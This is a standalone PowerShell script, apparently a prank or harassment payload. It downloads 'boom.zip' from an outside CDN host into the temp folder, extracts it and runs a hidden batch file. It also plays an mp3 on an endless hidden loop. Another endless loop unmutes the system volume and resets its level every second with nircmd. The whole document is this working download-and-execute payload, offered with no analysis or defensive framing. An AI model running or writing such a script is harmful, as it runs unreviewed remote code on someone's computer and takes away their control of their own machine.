Invoke-WebRequest https://cdn.statically.io/gh/l4l4l4l4ll/files/7209abfbab76b497421d3ce19fbbd8ba4cf58fdb/boom.zip -OutFile $env:temp\boom.zip
Expand-Archive -Force -Path $env:temp\boom.zip -DestinationPath $env:temp\boom
Start-Process -FilePath "$env:temp/boom/boom.bat" -WindowStyle Hidden
Start-Process -FilePath "$env:temp/boom/mpg123.exe" -WindowStyle Hidden -ArgumentList "--loop -1 $env:temp/boom/boom.mp3"
while ($true) {
  Start-Process -FilePath "$env:temp/boom/nircmd.exe" -WindowStyle Hidden -ArgumentList "mutesysvolume 0"
  Start-Process -FilePath "$env:temp/boom/nircmd.exe" -WindowStyle Hidden -ArgumentList "setsysvolume 1311"
  Start-Sleep -Seconds 1
}